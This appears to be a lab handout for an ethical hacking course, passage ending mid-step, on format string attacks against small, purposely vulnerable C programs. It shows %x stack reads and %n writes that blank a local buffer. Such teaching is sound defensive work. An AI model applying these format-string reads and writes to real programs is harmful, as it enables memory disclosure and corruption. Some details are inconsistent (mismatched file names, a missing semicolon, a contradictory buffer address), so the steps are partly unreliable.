# EHD Practical 15 - Format String Attack

###### tags: #EHD 

## Table of Contents
```toc
```

## Looking at Stack Contents Through Format String Attacks
**On Win10 VM**
1. Create the following C program called `formatstr.c`
```c
#include <stdio.h>
int main(int argc, char *argv[]) {
	printf(argv[1])
	return 0;
}
```

2. Compile the program
```
gcc -o formatstr1 formatstr1.c
```

3. Run the program with the argument `hello`
```
./formatstr1 hello
```

4. Run the program with the argument `hello%s`
```
./formatstr1 hello%s
```

5. Run the program with the argument `hello%08x`
```
./formatstr1 hello%08x
```

6. The data that appears after the string `hello` comes from the top of the stack
7. To see more of the stack, run the program with more format parameters
```
./formatstr1 %08x.%08x.%08x.%08x
```

8. To see even more content from the stack, use a Perl or Python script to generate the format parameters
```
./formatstr1 $(perl -e 'print "%08x." x 40')
./formatstr1 $(python2.7 -c 'print("%08x" * 40)')
./formatstr1 $(python3.6 -c 'print("%08x" * 40)')
```

## Format Parameter %n
> The format parameter %n will write the number of characters that have been written by the function so far to the specified variable address

**On Win10 VM**
1. Create the following C program `formatstr2.c`
```c
int main() {
	int count;
	printf("12345%n\n", &count);
	printf("Count: %d\n", count);
	return 0;
}
```

2. Compile and run the program without parameters. Count should have the value 5
3. Edit the program to add the following two lines:
```c
int main() {
	int count;
	printf("12345%n\n", &count);
	printf("Count: %d\n", count);
	printf("12345 67890%n\n",&count);
	printf("Count :%d\n", count);
	return 0;
}
```

4. Compile and run the program without parameters. The variable count should have the values 5 and 11
5. Edit the program to remove `&count` from the third line
```c
int main() {
	int count;
	printf("12345%n\n", &count);
	printf("Count: %d\n", count);
	printf("12345 67890%n\n"); // remove &count
	printf("Count :%d\n", count);
	return 0;
}
```

6. Run the program without parameters. The program will attempt to write the number 11 into the address at the top of the stack. This may cause the program to crash

## Using Format String Vulnerabilities to Change the Values of Local Variables
1. Create the following C program `formatstr3.c`
```c
#include <stdio.h>

int functionA(char *buffer, char *inputstring) {
  printf("address of buffer %x\n",buffer);
  printf("buffer %s\n", buffer);
  printf(inputstring);
  printf("\naddress of buffer %x\n",buffer);
  printf("buffer %s\n", buffer);
  return 0;
}

int main(int argc, char *argv[]) {
  char buffer[10] = "Goodbye";
  functionA(buffer, argv[1]);
  return 0;
}
```

2. Compile and run the program with the argument `Hello`
```
gcc -o formatstr3 formatstr3.c
./formatstr3 Hello
```

3. You may get output like the following:
```
address of buffer ffffcc26
buffer Goodbye
Hello
address of buffer ffffcc26
buffer Goodbye
```

4. Run the program with the arguments `%x.%x.%x.%x.%x.%x.%x` to get the top 7 words from the stack
```
./formatstr3 %x.%x.%x.%x.%x.%x.%x
```

5. You may get the following output:
```
address of buffer ffffcc26
buffer Goodbye
0.ffffc934.0.ffffcc30.401126.ffffcc26.8036a4689
address of buffer ffffcc26
buffer Goodbye
```

6. Change the number of `%x` so that the address of the buffer is the last word to be displayed
7. Change the last `%x` to `%n` so that instead of `%x` which will display the current word in the stack, `%n` will write something to the address contained in the current word of the stack
```
./formatstr3 %x.%x.%x.%x.%x.%n
```
8. You may get the following output:
```
address of buffer bfc8a902
buffer Goodbye
0.ffffc934.0.ffffcc30.401126.
address of buffer bfc8a902
buffer
```

9. We have changed the variable buffer to an empty string
10. To change the buffer 